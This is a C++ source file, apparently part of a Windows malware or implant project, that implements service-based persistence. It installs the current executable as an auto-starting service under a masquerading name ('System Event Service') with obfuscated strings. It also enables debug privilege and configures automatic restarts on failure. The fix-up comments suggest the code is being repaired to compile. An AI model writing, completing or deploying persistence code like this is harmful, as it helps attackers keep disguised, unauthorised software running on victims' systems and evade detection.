#include "persistence/ServicePersistence.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "utils/FileUtils.h"
#include "security/PrivilegeEscalation.h"  // Fixed include path
#include "security/Obfuscation.h"
#include <Windows.h>
#include <string>
#include <vector>

// Obfuscated strings - need to use the actual obfuscated values
const auto OBF_SERVICE_PERSISTENCE = OBFUSCATE("ServicePersistence");
const auto OBF_SERVICE_NAME = OBFUSCATE("SystemEventService");
const auto OBF_SERVICE_DISPLAY = OBFUSCATE("System Event Service");
const auto OBF_SERVICE_DESC = OBFUSCATE("Monitors system events and performance");

ServicePersistence::ServicePersistence(Configuration* config)
    : BasePersistence(config) {}

bool ServicePersistence::Install() {
    if (IsInstalled()) {
        return true;
    }

    if (!PrivilegeEscalation::EnablePrivilege(SE_DEBUG_NAME)) {  // Fixed namespace
        LOG_WARN("Failed to enable debug privilege");
    }

    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        LOG_ERROR("Failed to open Service Control Manager: " + std::to_string(GetLastError()));
        return false;
    }

    std::string exePath = utils::FileUtils::GetCurrentExecutablePath();  // Fixed return type
    std::wstring wideExePath = utils::FileUtils::StringToWide(exePath);  // Convert to wide string
    std::wstring fullPath = L"\"" + wideExePath + L"\" --service";

    // Use the actual obfuscated string values
    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
    std::wstring serviceDisplay = utils::FileUtils::StringToWide(OBF_SERVICE_DISPLAY);
    std::wstring serviceDesc = utils::FileUtils::StringToWide(OBF_SERVICE_DESC);

    SC_HANDLE service = CreateServiceW(
        scm,
        serviceName.c_str(),  // Use the actual string
        serviceDisplay.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        fullPath.c_str(),
        NULL, NULL, NULL, NULL, NULL);

    if (!service) {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_EXISTS) {
            LOG_DEBUG("Service already exists");
            service = OpenServiceW(scm, serviceName.c_str(), SERVICE_ALL_ACCESS);
        } else {
            LOG_ERROR("Failed to create service: " + std::to_string(error));
            CloseServiceHandle(scm);
            return false;
        }
    }

    // Set service description
    SERVICE_DESCRIPTIONW desc = { const_cast<LPWSTR>(serviceDesc.c_str()) };
    ChangeServiceConfig2W(service, SERVICE_CONFIG_DESCRIPTION, &desc);

    // Set failure actions
    SC_ACTION failureActions[3] = {
        { SC_ACTION_RESTART, 60000 },    // Restart after 60 seconds
        { SC_ACTION_RESTART, 60000 },    // Restart after 60 seconds
        { SC_ACTION_NONE, 0 }            // Then take no action
    };

    SERVICE_FAILURE_ACTIONSW failureConfig = {
        0,     // dwResetPeriod
        L"",   // lpRebootMsg
        L"",   // lpCommand
        3,     // cActions
        failureActions
    };

    ChangeServiceConfig2W(service, SERVICE_CONFIG_FAILURE_ACTIONS, &failureConfig);

    CloseServiceHandle(service);
    CloseServiceHandle(scm);

    m_installed = true;
    LOG_INFO("Service persistence installed successfully");
    return true;
}

bool ServicePersistence::Remove() {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        LOG_ERROR("Failed to open Service Control Manager: " + std::to_string(GetLastError()));
        return false;
    }

    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
    SC_HANDLE service = OpenServiceW(scm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    if (!service) {
        LOG_DEBUG("Service not found, nothing to remove");
        CloseServiceHandle(scm);
        return true;
    }

    SERVICE_STATUS status;
    ControlService(service, SERVICE_CONTROL_STOP, &status);

    bool success = DeleteService(service);
    CloseServiceHandle(service);
    CloseServiceHandle(scm);

    if (success) {
        m_installed = false;
        LOG_INFO("Service persistence removed successfully");
    } else {
        LOG_ERROR("Failed to delete service: " + std::to_string(GetLastError()));
    }

    return success;
}

bool ServicePersistence::IsInstalled() const {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        return false;
    }

    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
    SC_HANDLE service = OpenServiceW(scm, serviceName.c_str(), SERVICE_QUERY_CONFIG);
    CloseServiceHandle(scm);

    if (!service) {
        return false;
    }

    CloseServiceHandle(service);
    return true;
}

bool ServicePersistence::StartService() {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        return false;
    }

    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
    SC_HANDLE service = OpenServiceW(scm, serviceName.c_str(), SERVICE_START);
    if (!service) {
        CloseServiceHandle(scm);
        return false;
    }

    bool success = ::StartServiceW(service, 0, NULL);  // Use :: to specify global namespace
    CloseServiceHandle(service);
    CloseServiceHandle(scm);

    return success;
}

bool ServicePersistence::StopService() {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        return false;
    }

    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
    SC_HANDLE service = OpenServiceW(scm, serviceName.c_str(), SERVICE_STOP);
    if (!service) {
        CloseServiceHandle(scm);
        return false;
    }

    SERVICE_STATUS status;
    bool success = ControlService(service, SERVICE_CONTROL_STOP, &status);
    CloseServiceHandle(service);
    CloseServiceHandle(scm);

    return success;
}